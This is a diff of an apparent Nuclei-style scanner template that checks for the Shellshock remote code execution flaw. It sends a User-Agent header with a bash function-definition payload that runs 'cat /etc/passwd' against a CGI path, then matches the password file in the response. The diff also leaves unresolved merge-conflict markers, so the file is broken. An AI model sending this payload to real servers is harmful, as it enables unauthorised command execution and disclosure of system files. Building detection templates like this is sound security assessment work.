@@ -1,6 +1,7 @@
 id: rce-user-agent-shell-shock
 
 info:
+<<<<<<< HEAD
  name: Remote Code Execution Via (User-Agent)
  author: 0xelkomy
  severity: high
@@ -16,3 +17,23 @@ requests:
       regex:
        - "root:[x*]:0:0"
       part: body
+=======
+  name: Remote Code Execution Via (User-Agent)
+  author: 0xelkomy
+  severity: high
+  tags: shellshock,rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/status"
+
+    headers:
+      User-Agent: "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0"
+        part: body
+>>>>>>> 5d36d276 (add new stuff)
